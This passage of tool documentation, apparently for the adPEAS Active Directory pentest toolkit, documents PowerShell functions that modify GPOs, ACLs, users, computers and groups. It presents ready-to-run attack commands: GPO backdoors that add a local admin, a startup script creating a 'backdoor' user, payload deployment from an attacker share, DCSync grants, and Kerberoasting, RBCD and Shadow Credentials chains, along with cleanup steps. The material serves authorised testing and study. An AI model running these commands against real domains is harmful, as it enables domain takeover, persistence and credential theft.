| **Удалить сценарий входа** | `-RemoveLogonScript -ScriptName` | Удалить добавленный сценарий входа | Очистка |

### Синтаксис

```powershell
Set-DomainGPO
    -Identity <String>
    [-LinkTo <String>] [-LinkEnabled] [-LinkEnforced]
    [-UnlinkFrom <String>]
    [-Owner <String>]
    [-GrantRights <String>] [-Principal <String>]
    [-AddScheduledTask] [-TaskName <String>] [-TaskCommand <String>] [-TaskArguments <String>] [-TaskRunAs <String>]
    [-AddLocalGroupMember] [-LocalGroup <String>] [-MemberToAdd <String>]
    [-AddStartupScript] [-AddLogonScript] [-ScriptPath <String>] [-ScriptContent <String>] [-ScriptName <String>] [-ScriptParameters <String>]
    [-AddService] [-ServiceName <String>] [-BinaryPath <String>] [-ServiceDisplayName <String>] [-StartType <String>] [-ServiceAccount <String>]
    [-DeployFile] [-SourceFile <String>] [-DestinationPath <String>] [-FileAction <String>]
    [-AddFirewallRule] [-RuleName <String>] [-RuleDirection <String>] [-RuleAction <String>] [-RuleProtocol <String>] [-RuleLocalPort <String>] [-RuleRemotePort <String>] [-RuleRemoteAddress <String>] [-RuleProgram <String>]
    [-Export <String>]
    [-Import <String>]
    [-RemoveScheduledTask -TaskName <String>]
    [-RemoveLocalGroupMember -LocalGroup <String> -MemberToAdd <String>]
    [-RemoveService -ServiceName <String>]
    [-RemoveDeployedFile -FileName <String>]
    [-RemoveFirewallRule -RuleName <String>]
    [-RemoveStartupScript -ScriptName <String>]
    [-RemoveLogonScript -ScriptName <String>]
    [-SyncSYSVOL]
    [-NoSYSVOL]
    [-PassThru]
    [-Domain <String>]
    [-Server <String>]
    [-Credential <PSCredential>]
```

### Примеры

```powershell
# Привязать GPO к OU
Set-DomainGPO -Identity "Malicious Policy" -LinkTo "OU=Servers,DC=contoso,DC=com"

# Привязка с принудительным применением
Set-DomainGPO -Identity "Malicious Policy" -LinkTo "OU=Servers,DC=contoso,DC=com" -LinkEnforced

# Удалить привязку GPO
Set-DomainGPO -Identity "Malicious Policy" -UnlinkFrom "OU=Servers,DC=contoso,DC=com"

# Получить владение
Set-DomainGPO -Identity "Default Domain Policy" -Owner "CONTOSO\attacker"

# Предоставить права на редактирование
Set-DomainGPO -Identity "Default Domain Policy" -GrantRights GenericAll -Principal "CONTOSO\attacker"

# Добавить немедленное задание (выполняется от SYSTEM)
Set-DomainGPO -Identity "Backdoor Policy" -AddScheduledTask -TaskName "Update" -TaskCommand "cmd.exe" -TaskArguments "/c whoami > C:\temp\test.txt"

# Добавить пользователя в локальные Administrators через GPO
Set-DomainGPO -Identity "Admin Policy" -AddLocalGroupMember -LocalGroup "Administrators" -MemberToAdd "CONTOSO\attacker"

# Развернуть сценарий запуска
Set-DomainGPO -Identity "Script Policy" -AddStartupScript -ScriptContent "net user backdoor P@ss /add" -ScriptName "update.bat"

# Установить службу Windows через GPO
Set-DomainGPO -Identity "Service Policy" -AddService -ServiceName "UpdateSvc" -BinaryPath "C:\Windows\Temp\svc.exe" -StartType Automatic

# Развернуть файл через GPO
Set-DomainGPO -Identity "Deploy Policy" -DeployFile -SourceFile "\\attacker\share\payload.exe" -DestinationPath "C:\Windows\Temp\update.exe" -FileAction Create

# Добавить правило брандмауэра, разрешающее C2-трафик
Set-DomainGPO -Identity "FW Policy" -AddFirewallRule -RuleName "Allow Updates" -RuleDirection Outbound -RuleAction Allow -RuleProtocol TCP -RuleRemotePort 443

# --- Резервная копия / откат (вручную оператором, как в Set-CertificateTemplate) ---

# Сохранить GPO ДО изменения (атрибуты AD + всё дерево SYSVOL → один JSON)
Set-DomainGPO -Identity "Default Domain Policy" -Export ".\DDP_backup.json"

# Восстановить GPO из копии на сервере (перезаписывает SYSVOL, удаляет внесённые файлы,
# восстанавливает атрибуты расширений и версию). НЕ отменяет уже применённые изменения на клиентах.
Set-DomainGPO -Identity "Default Domain Policy" -Import ".\DDP_backup.json"

# Точечно удалить одно добавленное содержимое по имени (JSON не нужен)
Set-DomainGPO -Identity "Backdoor Policy" -RemoveScheduledTask -TaskName "Update"
Set-DomainGPO -Identity "Admin Policy" -RemoveLocalGroupMember -LocalGroup "Administrators" -MemberToAdd "CONTOSO\attacker"
Set-DomainGPO -Identity "Service Policy" -RemoveService -ServiceName "UpdateSvc"
Set-DomainGPO -Identity "Script Policy" -RemoveStartupScript -ScriptName "update.bat"
```

> **Примечание.** Резервирование и откат выполняются **оператором** — автоматической резервной копии нет. Запускайте `-Export`
> до изменения GPO. `-Import` и ключи `-Remove*` восстанавливают **определение GPO на
> сервере**; они не отменяют изменения, уже применённые Group Policy Preferences на клиентах
> (например, пользователя, добавленного в локальную группу). Такие изменения откатываются отдельно.

---

## Set-DomainObject

Low-level function for modifying any AD object. Used internally by other Set-* functions.

### Syntax

```powershell
Set-DomainObject
    [-Identity <String>]
    [-SearchBase <String>]
    [-Set <Hashtable>]
    [-Append <Hashtable>]
    [-Remove <Hashtable>]
    [-Clear <String[]>]
    [-Principal <String>]
    [-Rights <String>]
    [-ExtendedRight <String>]
    [-GrantACE]
    [-RevokeACE]
    [-DenyACE]
    [-ClearACE]
    [-SetOwner]
    [-Domain <String>]
    [-Server <String>]
    [-Credential <PSCredential>]
```

### Architecture

Set-DomainObject uses the unified `LdapConnection` architecture with `ModifyRequest`:

```
Set-DomainObject
    |
    +-> Invoke-LDAPSearch (find object)
    |       |
    |       +-> $Script:LdapConnection
    |
    +-> ModifyRequest (attribute changes)
    |       |
    |       +-> DirectoryAttributeModification (Add/Replace/Delete)
    |       |
    |       +-> $Script:LdapConnection.SendRequest()
    |
    +-> ACL Modifications
            |
            +-> Invoke-LDAPSearch -Raw (get nTSecurityDescriptor bytes)
            |
            +-> ActiveDirectorySecurity (parse/modify ACL)
            |
            +-> ModifyRequest (write nTSecurityDescriptor bytes)
            |
            +-> $Script:LdapConnection.SendRequest()
```

### Available Operations

| Operation | Parameter | Description |
|-----------|-----------|-------------|
| **Set Attributes** | `-Set` | Replace attribute values |
| **Append Values** | `-Append` | Add to multi-valued attributes |
| **Remove Values** | `-Remove` | Remove from multi-valued attributes |
| **Clear Attributes** | `-Clear` | Remove all values from attributes |
| **Grant ACE** | `-GrantACE -Principal -Rights` | Add Allow ACE |
| **Revoke ACE** | `-RevokeACE -Principal -Rights` | Remove ACE |
| **Deny ACE** | `-DenyACE -Principal -Rights` | Add Deny ACE |
| **Clear ACE** | `-ClearACE -Principal` | Remove all ACEs for principal |
| **Set Owner** | `-SetOwner -Principal` | Change object owner |

### Parameters (Attribute Operations)

| Parameter | Type | Description |
|-----------|------|-------------|
| `-Identity` | String | Object identity (sAMAccountName, DN, SID) |
| `-SearchBase` | String | Alternative SearchBase (DN) |
| `-Set` | Hashtable | Attributes to set (replace values) |
| `-Append` | Hashtable | Values to append (multi-valued attributes) |
| `-Remove` | Hashtable | Values to remove (multi-valued attributes) |
| `-Clear` | String[] | Attributes to clear (remove all values) |

### Parameters (ACL Operations)

| Parameter | Type | Description |
|-----------|------|-------------|
| `-Principal` | String | Security principal (user/group) for ACL modification |
| `-Rights` | String | AD rights to grant/revoke (GenericAll, WriteDacl, etc.) |
| `-ExtendedRight` | String | Extended right alias (DCSync, ResetPassword, etc.) |
| `-GrantACE` | Switch | Add Allow ACE |
| `-RevokeACE` | Switch | Remove ACE |
| `-DenyACE` | Switch | Add Deny ACE |
| `-ClearACE` | Switch | Remove all ACEs for principal |
| `-SetOwner` | Switch | Change object owner |

### Extended Right Aliases

| Alias | Description |
|-------|-------------|
| `DCSync` | All 3 DCSync rights (Get-Changes + Get-Changes-All + Get-Changes-In-Filtered-Set) |
| `ForceChangePassword` | Reset user password (User-Force-Change-Password) |
| `ResetPassword` | Alias for ForceChangePassword |
| `AddMember` | Add to group (Self-Membership WriteProperty) |
| `SendAs` | Send as user (Exchange) |
| `ReceiveAs` | Receive as user (Exchange) |
| `ReadLAPSPassword` | Read LAPS password (ms-Mcs-AdmPwd ReadProperty) |
| `CertEnroll` | Certificate enrollment |
| `AutoEnroll` | Certificate auto-enrollment |
| `AllowedToAuthenticate` | Allowed to authenticate |
| `ReplicateDirectory` | Replicate directory changes |
| `InstallReplica` | Install domain replica |
| `CloneDC` | Clone a domain controller |
| `MigrateSIDHistory` | Migrate SID history |
| `ApplyGroupPolicy` | Apply group policy |
| `CreateGPOLink` | Create GPO link |
| `GenerateRSoPLogging` | Generate RSoP logging data |
| `GenerateRSoPPlanning` | Generate RSoP planning data |
| `ReanimateTombstones` | Reanimate tombstoned objects |
| `SelfMembership` | Add/remove self from group |
| `AllExtendedRights` | All extended rights (dangerous!) |

### Examples

```powershell
# Set attribute
Set-DomainObject -Identity "jdoe" -Set @{description = "Test User"}

# Append to multi-valued attribute
Set-DomainObject -Identity "jdoe" -Append @{servicePrincipalName = "HTTP/web01"}

# Remove specific value
Set-DomainObject -Identity "jdoe" -Remove @{servicePrincipalName = "HTTP/web01"}

# Clear attribute
Set-DomainObject -Identity "jdoe" -Clear @("description")

# Grant DCSync rights
Set-DomainObject -Identity "DC=contoso,DC=com" -Principal "CONTOSO\attacker" -ExtendedRight "DCSync" -GrantACE
# Attacker can now DCSync!

# Grant GenericAll on user
Set-DomainObject -Identity "CN=AdminUser,CN=Users,DC=contoso,DC=com" -Principal "CONTOSO\attacker" -Rights "GenericAll" -GrantACE

# Take ownership
Set-DomainObject -Identity "jdoe" -Principal "CONTOSO\newowner" -SetOwner

# Revoke ACE (cleanup)
Set-DomainObject -Identity "DC=contoso,DC=com" -Principal "CONTOSO\attacker" -ExtendedRight "DCSync" -RevokeACE
```

### Return Value

Returns `$true` on success, `$false` on failure.

---

## Move-DomainObject

Moves an object to a different container and/or renames it, via LDAP ModifyDN.

An object's OU membership is **not an attribute**. It is the object's position in the directory tree, carried by its `distinguishedName` — there is nothing to write, which is why `Set-DomainObject` cannot relocate an object and this is a function of its own. Moving and renaming are the same LDAP operation (`ModifyDN`, RFC 4511), so one request can do either or both.

Works on **any** object class: users, computers, groups, GPOs, and organizational units including their entire subtree.

### Available Operations

| Operation | Parameter | Description | Attack Technique |
|-----------|-----------|-------------|------------------|
| **Move** | `-DestinationOU` | Relocate object to another container | Apply a different GPO, or escape a hardening GPO |
| **Rename** | `-NewName` | Change the object's RDN | Camouflage |
| **Move + Rename** | both | Both in a single ModifyDN request | Relocate while camouflaging |

### Syntax

```powershell
Move-DomainObject
    -Identity <String>
    [-DestinationOU <String>]
    [-NewName <String>]
    [-PassThru]
    [-Domain <String>]
    [-Server <String>]
    [-Credential <PSCredential>]
```

At least one of `-DestinationOU` and `-NewName` is required.

`-NewName` takes a **bare value without the attribute prefix** — `"Jane Smith"`, not `"CN=Jane Smith"`. The attribute type is carried over from the current RDN, because AD does not allow changing it (a `CN` cannot become an `OU`). Escaping is applied for you, so a name containing a comma, a leading `#` or a trailing space is handled correctly.

An identity that matches more than one object is rejected rather than resolved to the first match — pass a `distinguishedName` to disambiguate.

### Required Permissions

A move needs rights at **both ends**, which is the usual reason it fails:

| Right | Where |
|-------|-------|
| `Delete Child` for the object's class | the **source** container |
| `Create Child` for the object's class | the **target** container |

A move consumes the delete right, so write access to the target alone is not enough. A "protected from accidental deletion" ACE (`Deny Delete` / `Delete Tree` on Everyone) on the object blocks the move even for an account that holds both rights. A pure rename needs `WriteProperty` on the naming attribute (`cn` / `ou` / `name`) instead.

Check both ends before trying:

```powershell
Get-ObjectACL -Identity "OU=Finance,DC=contoso,DC=com" -WriteOnly
Get-ObjectACL -Identity "OU=Sales,DC=contoso,DC=com" -WriteOnly
```

`Create Child` on an OU is what [Get-AddComputerRights](04-Security-Checks.md#get-addcomputerrights) and [Get-GPOPermissions](04-Security-Checks.md#get-gpopermissions) report — those findings are what make a move possible in the first place.

### What a Move Changes

| | |
|---|---|
| **Unchanged** | `objectGUID`, `objectSID`, group memberships, Kerberos principal, every ACE that references the object |
| **Changed** | which GPOs apply, which delegated ACLs reach the object, the `distinguishedName` |

Because the SID survives, the account keeps working the moment the move completes. What actually changes is its policy and delegation context — which is usually the point of moving it.

### Examples

```powershell
# Move a user to another OU
Move-DomainObject -Identity "jdoe" -DestinationOU "OU=Sales,DC=contoso,DC=com"

# Rename in place - the comma is escaped automatically
Move-DomainObject -Identity "jdoe" -NewName "Doe, Jane"
# Object is now CN=Doe\, Jane,OU=Finance,DC=contoso,DC=com

# Move and rename in a single request
Move-DomainObject -Identity "CN=WS01,CN=Computers,DC=contoso,DC=com" -DestinationOU "OU=Tier0,DC=contoso,DC=com" -NewName "WS01-T0"

# Move an entire OU with its subtree
Move-DomainObject -Identity "OU=Old,DC=contoso,DC=com" -DestinationOU "OU=Archive,DC=contoso,DC=com"

# Escalation: move a controlled computer into an OU where a privileged GPO applies
Move-DomainObject -Identity "EVILPC$" -DestinationOU "OU=Tier0 Servers,DC=contoso,DC=com"
# On the next policy refresh the computer applies that OU's GPOs - including any
# Restricted Groups membership or startup script they deploy

# The defensive inverse: move a host OUT of the OU that applies a hardening GPO
Move-DomainObject -Identity "SRV01$" -DestinationOU "OU=Unmanaged,DC=contoso,DC=com"
# The host stops receiving the hardening policy on the next refresh

# Scripted use
$result = Move-DomainObject -Identity "jdoe" -DestinationOU "OU=Sales,DC=contoso,DC=com" -PassThru
$result.NewDistinguishedName

# Cleanup: move it back
Move-DomainObject -Identity "jdoe" -DestinationOU "OU=Finance,DC=contoso,DC=com"
```

### Validation Before the Write

These cases are rejected before any request is sent, because the DC's own error for each of them points away from the cause:

| Rejected | Why the DC's own error misleads |
|----------|---------------------------------|
| Destination in **another domain** | `affectsMultipleDSAs` — ModifyDN cannot cross a domain boundary. A cross-domain move is a different operation entirely, requiring SID history. |
| Destination is the object itself or **below it** | `unwillingToPerform`. Easy to hit when moving an OU — it would detach the subtree. |
| Destination container missing or unreadable | `noSuchObject`, which could equally mean the source object. |
| `systemFlags` forbids move or rename | A bare `unwillingToPerform` with no stated reason. |
| Object already at that location and name | Reported as a no-op; nothing is written. |

**Permissions are not pre-checked.** The DC decides that when the write is sent, so a move can still fail after every check above has passed — lacking rights is the most common outcome in practice. `ModifyDN` is atomic, so a rejected move leaves the object untouched: there is no partial or half-moved state. On failure, the error names the rights the operation needs.

### Return Value

Returns `$true` on success, or when the object is already in place. Returns `$false` on failure.

With `-PassThru`, returns an object with `Operation`, `Object`, `NewDistinguishedName`, `ObjectClass`, `Success` and `Message`, plus `ResultCode` and `ResultName` when the directory rejected the write.

---

## New-DomainUser

Creates a new user account in Active Directory via DirectoryEntry.

### Syntax

```powershell
New-DomainUser
    [-Name] <String>
    [-Password <String>]
    [-OrganizationalUnit <String>]
    [-Description <String>]
    [-Enabled <Boolean>]
    [-PassThru]
    [-Domain <String>]
    [-Server <String>]
    [-Credential <PSCredential>]
```

### Parameters

| Parameter | Type | Description |
|-----------|------|-------------|
| `-Name` | String | sAMAccountName for the new user. Also used for CN and UPN. |
| `-Password` | String | Password for the new user (plaintext). If not specified, a random 20-character complex password is generated. |
| `-OrganizationalUnit` | String | DistinguishedName of the OU where the user should be created. Default: CN=Users,DC=domain,DC=com |
| `-Description` | String | Description attribute for the user account. |
| `-Enabled` | Boolean | Whether the account should be enabled after creation. Default: $true |
| `-PassThru` | Switch | Returns a result object instead of console output. Useful for scripting. |
| `-Domain` | String | Target domain (FQDN) |
| `-Server` | String | Specific Domain Controller to target |
| `-Credential` | PSCredential | PSCredential object for authentication |

### Examples

```powershell
# Create user with auto-generated password
New-DomainUser -Name "testuser"

# Create user with custom password
New-DomainUser -Name "testuser" -Password "P@ssw0rd123!"

# Create user in specific OU
New-DomainUser -Name "serviceaccount" -Password "C0mpl3x!" -OrganizationalUnit "OU=Service Accounts,DC=contoso,DC=com"

# Create disabled user
New-DomainUser -Name "serviceaccount" -Enabled $false

# Create user and capture result for scripting
$result = New-DomainUser -Name "testuser" -PassThru
if ($result.Success) {
    Write-Host "Password: $($result.Password)"
}
```

### Output (Console)

```
[+] Successfully created user: testuser
Distinguished Name                           CN=testuser,CN=Users,DC=contoso,DC=com
Enabled                                      True
Password (SAVE THIS!)                        K8#mP2@xL9!nQ4$wR7
```

### Output (-PassThru)

```powershell
[PSCustomObject]@{
    Operation = "CreateUser"
    User = "testuser"
    DistinguishedName = "CN=testuser,CN=Users,DC=contoso,DC=com"
    Enabled = $true
    Success = $true
    Message = "User successfully created"
    Password = "K8#mP2@xL9!nQ4$wR7"  # Only if auto-generated
}
```

---

## New-DomainComputer

Creates a new computer account in Active Directory via DirectoryEntry.

### Syntax

```powershell
New-DomainComputer
    [-Name] <String>
    [-Password <String>]
    [-OrganizationalUnit <String>]
    [-Description <String>]
    [-Enabled <Boolean>]
    [-PassThru]
    [-Domain <String>]
    [-Server <String>]
    [-Credential <PSCredential>]
```

### Parameters

| Parameter | Type | Description |
|-----------|------|-------------|
| `-Name` | String | sAMAccountName for the new computer. Will automatically add $ suffix if not present. |
| `-Password` | String | Password for the new computer account (plaintext). If not specified, a random 20-character complex password is generated. |
| `-OrganizationalUnit` | String | DistinguishedName of the OU where the computer should be created. Default: CN=Computers,DC=domain,DC=com |
| `-Description` | String | Description attribute for the computer account. |
| `-Enabled` | Boolean | Whether the account should be enabled after creation. Default: $true |
| `-PassThru` | Switch | Returns a result object instead of console output. Useful for scripting. |
| `-Domain` | String | Target domain (FQDN) |
| `-Server` | String | Specific Domain Controller to target |
| `-Credential` | PSCredential | PSCredential object for authentication |

### Use Cases

By default, MachineAccountQuota allows all domain users to create up to 10 computer objects. This can be exploited for:

- **RBCD Attacks**: Create computer account → Configure delegation → Impersonate users
- **Relay Attacks**: Create machine account for relay targets
- **Persistence**: Create hidden computer accounts

### Examples

```powershell
# Create computer with auto-generated password
New-DomainComputer -Name "FAKE-PC01"

# Create computer with custom password (for RBCD attacks)
New-DomainComputer -Name "RBCD-ATTACK" -Password "P@ssw0rd123!"

# Create computer in specific OU
New-DomainComputer -Name "TESTPC" -OrganizationalUnit "OU=Workstations,DC=contoso,DC=com"

# Create computer and capture password for scripting
$comp = New-DomainComputer -Name "BACKDOOR-PC" -PassThru
Write-Host "Computer created! Password: $($comp.Password)"
```

### Output (Console)

```
[+] Successfully created computer: FAKE-PC01$
Distinguished Name                           CN=FAKE-PC01,CN=Computers,DC=contoso,DC=com
DNS Hostname                                 FAKE-PC01.contoso.com
Enabled                                      True
Password (SAVE THIS!)                        X9@kL2#mP5!nQ8$wR3
```

### Output (-PassThru)

```powershell
[PSCustomObject]@{
    Operation = "CreateComputer"
    Computer = "FAKE-PC01$"
    DistinguishedName = "CN=FAKE-PC01,CN=Computers,DC=contoso,DC=com"
    DNSHostName = "FAKE-PC01.contoso.com"
    Enabled = $true
    Success = $true
    Message = "Computer successfully created"
    Password = "X9@kL2#mP5!nQ8$wR3"  # Only if auto-generated
}
```

---

## New-DomainGroup

Creates a new group object in Active Directory via DirectoryEntry.

### Syntax

```powershell
New-DomainGroup
    [-Name] <String>
    [-OrganizationalUnit <String>]
    [-Description <String>]
    [-GroupScope <String>]
    [-GroupType <String>]
    [-PassThru]
    [-Domain <String>]
    [-Server <String>]
    [-Credential <PSCredential>]
```

### Parameters

| Parameter | Type | Description |
|-----------|------|-------------|
| `-Name` | String | sAMAccountName for the new group. |
| `-OrganizationalUnit` | String | DistinguishedName of the OU where the group should be created. Default: CN=Users,DC=domain,DC=com |
| `-Description` | String | Description attribute for the group. |
| `-GroupScope` | String | Group scope: `Global`, `Universal`, or `DomainLocal`. Default: Global |
| `-GroupType` | String | Group type: `Security` or `Distribution`. Default: Security |
| `-PassThru` | Switch | Returns a result object instead of console output. Useful for scripting. |
| `-Domain` | String | Target domain (FQDN) |
| `-Server` | String | Specific Domain Controller to target |
| `-Credential` | PSCredential | PSCredential object for authentication |

### Group Scopes

| Scope | Members From | Can Be Used In |
|-------|--------------|----------------|
| **Global** | Same domain only | Any domain in forest |
| **Universal** | Any domain in forest | Any domain in forest |
| **DomainLocal** | Any domain | Same domain only |

### Examples

```powershell
# Create global security group (default)
New-DomainGroup -Name "IT-Admins"

# Create universal security group
New-DomainGroup -Name "Enterprise-Admins-Custom" -GroupScope Universal

# Create domain-local group
New-DomainGroup -Name "Server-LocalAdmins" -GroupScope DomainLocal

# Create distribution group (for email)
New-DomainGroup -Name "EmailList" -GroupType Distribution -GroupScope Universal

# Create group in specific OU with description
New-DomainGroup -Name "DBAs" -OrganizationalUnit "OU=Groups,DC=contoso,DC=com" -Description "Database Administrators"

# Create and capture result
$result = New-DomainGroup -Name "TestGroup" -PassThru
```

### Output (Console)

```
[+] Successfully created group: IT-Admins
Distinguished Name                           CN=IT-Admins,CN=Users,DC=contoso,DC=com
Type                                         Security
Scope                                        Global
```

### Output (-PassThru)

```powershell
[PSCustomObject]@{
    Operation = "CreateGroup"
    Group = "IT-Admins"
    DistinguishedName = "CN=IT-Admins,CN=Users,DC=contoso,DC=com"
    GroupType = "Security"
    GroupScope = "Global"
    Success = $true
    Message = "Group successfully created"
}
```

---

## New-DomainGPO

Creates a new Group Policy Object in Active Directory with proper SYSVOL folder structure.

### Syntax

```powershell
New-DomainGPO
    [-DisplayName] <String>
    [-NoSYSVOL]
    [-PassThru]
    [-Domain <String>]
    [-Server <String>]
    [-Credential <PSCredential>]
```

### Parameters

| Parameter | Type | Description |
|-----------|------|-------------|
| `-DisplayName` | String | Display name for the new GPO (user-friendly name shown in GPMC). |
| `-NoSYSVOL` | Switch | Skip SYSVOL folder creation. Only the AD object will be created. The GPO will appear "broken" in GPMC until SYSVOL is populated manually. |
| `-PassThru` | Switch | Returns a result object instead of console output. Useful for scripting. |
| `-Domain` | String | Target domain (FQDN) |
| `-Server` | String | Specific Domain Controller to target |
| `-Credential` | PSCredential | PSCredential object for authentication |

### GPO Structure

When a GPO is created, it consists of two parts:

1. **AD Object**: `CN={GUID},CN=Policies,CN=System,DC=domain,DC=com`
   - Stores displayName, flags, versionNumber, gPCFileSysPath
   - Contains permissions (who can edit/apply)

2. **SYSVOL Folder**: `\\domain.com\SYSVOL\domain.com\Policies\{GUID}\`
   - `Machine\` - Machine configuration files
   - `User\` - User configuration files
   - `GPT.INI` - Version information

### Permission Mirroring

New-DomainGPO automatically mirrors AD object permissions to SYSVOL to prevent the GPMC "permissions inconsistent" warning:

| AD Object ACE | SYSVOL ACE |
|---------------|------------|
| GenericAll (0xF01FF/0xF00FF) | Full Control |
| GenericRead (0x20094) | Read & Execute |
| ExtendedRight (0x100) | Read & Execute |

### Examples

```powershell
# Create complete GPO (AD object + SYSVOL)
New-DomainGPO -DisplayName "Test Policy"

# Create GPO in remote domain
New-DomainGPO -DisplayName "Security Policy" -Domain "contoso.com" -Credential (Get-Credential)

# Create only AD object (no SYSVOL)
New-DomainGPO -DisplayName "AD Only GPO" -NoSYSVOL

# Create GPO and capture result for scripting
$result = New-DomainGPO -DisplayName "Audit Policy" -PassThru
if ($result.Success) {
    Write-Host "GPO GUID: $($result.GUID)"
    Write-Host "SYSVOL Created: $($result.SYSVOLCreated)"
}
```

### Output (Console)

```
[+] Successfully created GPO AD object: Test Policy
Distinguished Name                           CN={5C0EFBDD-70FB-4BA8-8965-1A015E7651FA},CN=Policies,CN=System,DC=contoso,DC=com
GUID                                         {5C0EFBDD-70FB-4BA8-8965-1A015E7651FA}
SYSVOL Path                                  \\contoso.com\SysVol\contoso.com\Policies\{5C0EFBDD-70FB-4BA8-8965-1A015E7651FA}
[+] SYSVOL folder structure created successfully
Machine folder                               \\dc01.contoso.com\SYSVOL\contoso.com\Policies\{5C0EFBDD-70FB-4BA8-8965-1A015E7651FA}\Machine
User folder                                  \\dc01.contoso.com\SYSVOL\contoso.com\Policies\{5C0EFBDD-70FB-4BA8-8965-1A015E7651FA}\User
GPT.INI                                      \\dc01.contoso.com\SYSVOL\contoso.com\Policies\{5C0EFBDD-70FB-4BA8-8965-1A015E7651FA}\GPT.INI
```

### Output (-PassThru)

```powershell
[PSCustomObject]@{
    Operation = "CreateGPO"
    DisplayName = "Test Policy"
    GUID = "{5C0EFBDD-70FB-4BA8-8965-1A015E7651FA}"
    DistinguishedName = "CN={5C0EFBDD-70FB-4BA8-8965-1A015E7651FA},CN=Policies,CN=System,DC=contoso,DC=com"
    SYSVOLPath = "\\contoso.com\SysVol\contoso.com\Policies\{5C0EFBDD-70FB-4BA8-8965-1A015E7651FA}"
    SYSVOLCreated = $true
    Success = $true
    Message = "GPO created successfully (AD object + SYSVOL)"
}
```

### Notes

- GPO is created without any settings (empty policy)
- Use `Set-DomainGPO` or GPMC to configure settings
- Link GPO to OUs using `Set-DomainGPO -Link` or GPMC
- If SYSVOL creation fails, the AD object is still created but GPO will appear broken in GPMC

---

## Common Attack Patterns

### 1. Kerberoasting Chain

```powershell
# Add SPN to high-value account
Set-DomainUser -Identity "svc_backup" -SetSPN "HTTP/fake.contoso.com"

# Kerberoast the account
Invoke-Kerberoast -Identity "svc_backup"

# Cleanup
Set-DomainUser -Identity "svc_backup" -ClearSPN "HTTP/fake.contoso.com"
```

### 2. ASREPRoasting Chain

```powershell
# Disable pre-authentication
Set-DomainUser -Identity "targetuser" -DontReqPreauth

# Roast the account
Invoke-ASREPRoast -Identity "targetuser"

# Cleanup
Set-DomainUser -Identity "targetuser" -ClearDontReqPreauth
```

### 3. RBCD Attack Chain

```powershell
# Create computer account
$pc = New-DomainComputer -Name "RBCD-ATTACK" -PassThru

# Configure RBCD on target
Set-DomainComputer -Identity "DC01" -AddRBCD "RBCD-ATTACK$"

# Get TGT for attack computer
$tgt = Invoke-KerberosAuth -UserName "RBCD-ATTACK$" -Domain "contoso.com" -Password $pc.Password

# Cleanup
Set-DomainComputer -Identity "DC01" -ClearRBCD -Force
```

### 4. Shadow Credentials Chain (PKINIT without CA)

Shadow Credentials allow PKINIT authentication **without requiring a Certificate Authority**. The certificate is self-signed and validated via the public key stored in `msDS-KeyCredentialLink`.

**Prerequisite:** Domain Functional Level **2016 or higher**. The `msDS-KeyCredentialLink` attribute only exists from DFL 2016 onwards.

```powershell
# Step 1: Add Shadow Credential (generates RSA key pair + self-signed certificate)
$result = Set-DomainUser -Identity "admin" -AddShadowCredential -PassThru

# Output includes:
# - PFXPath: Path to generated certificate
# - PFXPassword: Auto-generated password
# - DeviceID: For targeted cleanup

# Step 2: Use certificate for PKINIT authentication
Connect-adPEAS -Domain "contoso.com" -Certificate $result.PFXPath -CertificatePassword $result.PFXPassword

# You are now authenticated as "admin"!

# Step 3: Cleanup - remove specific Shadow Credential
Set-DomainUser -Identity "admin" -ClearShadowCredentials -DeviceID $result.DeviceID
```

**How it works**:
1. adPEAS generates an RSA-2048 key pair
2. The public key is stored in `msDS-KeyCredentialLink` (KEYCREDENTIALLINK_BLOB format)
3. A self-signed X.509 certificate is created with Smart Card Logon + Client Auth EKUs
4. The KDC validates PKINIT by checking the public key in AD (not via CA trust)

**Works on Computer accounts too** (e.g., for DCSync):
```powershell
$result = Set-DomainComputer -Identity "DC01" -AddShadowCredential -PassThru
Connect-adPEAS -Domain "contoso.com" -Certificate $result.PFXPath -CertificatePassword $result.PFXPassword
# Now authenticated as DC01$ - DCSync possible!
```

See [Authentication-Methods](03-Authentication-Methods.md#certificate-pkinit) for more PKINIT details.

### 5. Group Privilege Escalation

```powershell
# Add to Domain Admins (requires WriteMembers)
Set-DomainGroup -Identity "Domain Admins" -AddMember "attacker"

# Cleanup
Set-DomainGroup -Identity "Domain Admins" -RemoveMember "attacker"
```

---

## Cleanup Best Practices

> **Always clean up after testing!**

1. **Remove added SPNs**
   ```powershell
   Set-DomainUser -Identity "target" -ClearSPN "HTTP/fake.contoso.com"
   ```

2. **Re-enable pre-authentication**
   ```powershell
   Set-DomainUser -Identity "target" -ClearDontReqPreauth
   ```

3. **Remove RBCD configurations**
   ```powershell
   Set-DomainComputer -Identity "DC01" -ClearRBCD -Force
   ```

4. **Remove Shadow Credentials**
   ```powershell
   Set-DomainUser -Identity "target" -ClearShadowCredentials -Force
   ```

5. **Remove from groups**
   ```powershell
   Set-DomainGroup -Identity "Domain Admins" -RemoveMember "attacker"
   ```

6. **Revoke ACL changes**
   ```powershell
   Set-DomainObject -Identity "DC=contoso,DC=com" `
       -RevokeACE -Principal "CONTOSO\attacker" -ExtendedRight "DCSync"
   ```

7. **Restore certificate templates** (if backed up)
   ```powershell
   # Restore from backup...
   Set-CertificateTemplate -Identity "WebServer" `
       -DisableEnrolleeSuppliesSubject -AddManagerApproval
   ```

---

## PassThru for Scripting

All Set-* functions support `-PassThru` for programmatic use:

```powershell
$result = Set-DomainUser -Identity "target" -SetSPN "HTTP/test" -PassThru

if ($result.Success) {
    Write-Host "SPN added successfully"
    Write-Host "User is now Kerberoastable!"
} else {
    Write-Host "Failed: $($result.Message)"
}
```

### Return Object Structure

```powershell
[PSCustomObject]@{
    Operation = "SetSPN"
    User = "target"                    # or Computer, Group, etc.
    DistinguishedName = "CN=..."
    Success = $true/$false
    Message = "Operation result"
    # Additional operation-specific properties
}
```

---

## Navigation

- [Previous: Core-Functions](06-Core-Functions.md)
- [Next: Helper-Functions](08-Helper-Functions.md)
- [Back to Home](00-Home.md)
